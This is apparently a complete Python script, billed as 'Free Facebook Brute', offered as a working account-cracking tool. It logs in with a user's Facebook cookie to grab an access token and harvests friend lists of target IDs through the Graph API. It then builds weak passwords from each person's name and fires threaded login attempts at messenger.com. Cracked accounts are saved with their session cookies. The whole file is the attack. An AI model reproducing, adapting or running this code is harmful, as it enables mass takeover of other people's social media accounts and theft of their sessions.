#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Free Facebook Brute.
Code By Khamdihi Dev - Purbalingga
"""

import re, requests, json, os, uuid, random, sys, urllib, time
from concurrent.futures import ThreadPoolExecutor

P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"
pk = []

def Logo():
    print(r''' _____  _____  _____  _____
/  ___>/     \/  _  \/   __\ Create by
|___  ||  |--||  _  <|   __| %sKhamdihi dev%s
<_____/\_____/\_____/\_____/ Simpel Bruteforce %sv1.0%s'''%(H,P,H,P))

while True:
    if os.path.isfile('mydata.txt') is True:
       break
    else:
       try:
           os.system('clear')
           Logo()
           print('')
           cokie = {'cookie':input('[?] Masukan cookie : ')}
           req = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1', cookies = cokie).text
           act = re.search('act=(\d+)',str(req)).group(1)
           res = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&act=%s&breakdown_regrouping=1'%(act), cookies = cokie).text
           xyz = re.search('window.__accessToken="(.*?)"', str(res)).group(1)
           with open('mydata.txt',mode='w') as s:
              s.write('%s|%s'%(cokie['cookie'], xyz))
              s.close()
           break
       except Exception as e:
           print('\n[!] Login Erorr cookie invalid');time.sleep(2)

def menu():
    os.system('clear')
    try:
        cok, tok = open('mydata.txt','r').read().split('|')
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(tok), cookies = {'cookie':cok}).json()['name']
    except (KeyError,Exception):
        os.remove('mydata.txt')
        exit('\n%s[%s!%s] Invalid Cookie'%(P,K,P))
    Logo()
    print('''%s
[ %s %s %s ]\n
[%s1%s] Mulai Crack
[%s2%s] Check Hasil
[%s0%s] Log, Out\n'''%(P,H,nama,P,H,P,H,P,H,P))
    while True:
      x = input('[%s?%s] Pilih : '%(H,P))
      if x in ('1','01'):
         print('\n[%s?%s] Masukan id facebook pisahkan dengan koma'%(H,P))
         user = input('[%s?%s] Masukan id : '%(H,P))
         for id in user.split(','):
             if id.isdigit() is True or id in ('me'):
                xyz = dump(target=id, cookies=cok, token=tok, afer='')
             else:pass
         Crack().main(pk)
      elif x in ('2','02'):
         if os.path.isfile('OK-FB.txt') is True:
            print('\n [ AKUN OK ]\n')
            ok = 0
            for i in open('OK-FB.txt','r').read().splitlines():
                ok +=1
                print(' %s. %s'%(ok, i))
         else:
            print('\n[%s!%s] No result Ok'%(K,P))
         if os.path.isfile('CP-FB.txt') is True:
            print('\n [ AKUN CP ]\n')
            cp = 0
            for i in open('CP-FB.txt','r').read().splitlines():
                cp +=1
                print(' %s. %s'%(cp, i))
         else:
            print('\n[%s!%s] No result Cp'%(K,P))
         exit()
      elif x in ('0','00'):
         exit(os.remove('mydata.txt'))

class dump:

   id = pk
   def __init__(self, **args):
       self.public(args.get('target'),args.get('cookies'), args.get('token'), args.get('after'))

   def public(self, user, cokie, token, next):
       with requests.Session() as r:
         try:
             r.headers.update({'Host': 'graph.facebook.com','cache-control': 'max-age=0' ,'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','cookie':cokie})
             self.y = r.get('https://graph.facebook.com/%s/friends'%(user), params = {'access_token':token, 'after':next}).json()
             for self.x in self.y['data']:
                 self.z = self.x['id'] +'|'+ self.x['name']
                 if self.z not in self.id:
                    self.id.append(self.z)
                    print('\r[%s!%s] Berhasil Dump %s id'%(H,P,len(self.id)),end='  ')
             self.public(user, cokie, token,self.y['paging']['cursors']['after'])
         except:pass

class Crack:

   ok = 0
   cp = 0
   eh = 1
   id = []

   def __init__(self):
       pass

   def main(self, xyz):
       for self.i in xyz:
           self.id.append(self.i)
       print('\n\n\t [ Mainkan Mode Pesawat Total id %s ]\n'%(len(self.id)))
       with ThreadPoolExecutor(max_workers=30) as khamdihidev:
          for self.y in self.id:
              try:
                  uid, nama = self.y.split('|')
                  passwd = self.pwd(nama)
                  khamdihidev.submit(self.login, uid, passwd)
              except:pass
       exit()

   def pwd(self, nama):
       self.pw = []
       for self.y in nama.split(' '):
           if len(self.y) <3:continue
           elif len(self.y) <5:
                self.pw.append(self.y.capitalize() + '123')
                self.pw.append(self.y.lower() + '123')
                self.pw.append(self.y.lower() + '1234')
                self.pw.append(self.y.lower() + '12345')
           else:
                self.pw.append(self.y.capitalize() + '123')
                self.pw.append(self.y.lower() + '123')
                self.pw.append(self.y.lower() + '1234')
                self.pw.append(self.y.lower() + '12345')
                self.pw.append(nama.lower())
       return self.pw

   def Ua(self): #-> Oprek Ua Di Sini
       self.vs = random.randint(90,121)
       return 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s.0.0.0 Safari/537.36'%(self.vs)

   def login(self, user, password):
       with requests.Session() as s:
         for pw in password:
             try:
                 self.headers = {
                     'Authority':'www.messenger.com',
                     'Pragma':'no-cache',
                     'Cache-Control':'no-cache',
                     'Sec-Ch-Ua':'"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
                     'Sec-Ch-Ua-Mobile':'?0',
                     'Sec-Ch-Ua-Platform':'Linux',
                     'Origin':'https://www.messenger.com',
                     'Upgrade-Insecure-Requests':'1',
                     'Dnt':'1',
                     'Content-Type':'application/x-www-form-urlencoded',
                     'User-Agent':self.Ua(),
                     'Accept':'text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.9',
                     'Sec-Fetch-Site':'same-origin',
                     'Sec-Fetch-Mode':'navigate',
                     'Sec-Fetch-User':'?1',
                     'Sec-Fetch-Dest':'document',
                     'Referer':'https://www.messenger.com/',
                     'Accept-Language':'en-US, en;q=0.9',
                 }
                 self.request = s.get('https://www.messenger.com/').text
                 self.js_datr = re.search('"_js_datr","(.*?)"',str(self.request)).group(1)
                 self.payload = {
                     'jazoest':re.search('name="jazoest" value="(.*?)"', str(self.request)).group(1),
                     'lsd':re.search('name="lsd" value="(.*?)"', str(self.request)).group(1),
                     'initial_request_id':re.search('name="initial_request_id" value="(.*?)"', str(self.request)).group(1),
                     'timezone':'-420',
                     'lgndim':re.search('name="lgndim" value="(.*?)"', str(self.request)).group(1),
                     'lgnrnd':re.search('name="lgnrnd" value="(.*?)"', str(self.request)).group(1),
                     'lgnjs':'n',
                     'email':user,
                     'pass':pw,
                     'login':'1',
                     'persistent':'1',
                     'default_persistent':''
                 }
                 self.headers.update({'Content-Length': str(len(self.payload)),'Cookie':'wd=1010x980; dpr=2; datr=%s'%(self.js_datr)})
                 self.signature = urllib.parse.urlencode(self.payload,doseq=True)
                 self.response  = s.post('https://www.messenger.com/login/password/', data=self.signature, headers=self.headers)
                 if 'c_user' in s.cookies.get_dict():
                     self.auth = ';'.join(['%s=%s'%(x,y) for x,y in s.cookies.get_dict().items()])
                     print('\r %s* --> %s ★ %s ★ %s'%(H,user, pw, self.auth))
                     self.ok +=1
                     open('OK-FB.txt','a').write('%s|%s|%s\n'%(user,pw,self.auth))
                     break
                 elif 'checkpoint' in self.response.url:
                     print('\r %s* --> %s ★ %s'%(K,user,pw))
                     open('CP-FB.txt','a').write('%s|%s\n'%(user,pw))
                     self.cp +=1
                     break
             except requests.exceptions.ConnectionError:time.sleep(20)
       self.eh +=1
       print('\r%s[ main ] %s/%s ok:%s cp:%s'%(P,self.eh, len(self.id), self.ok, self.cp),end='  ');sys.stdout.flush()

if __name__ == '__main__':menu()
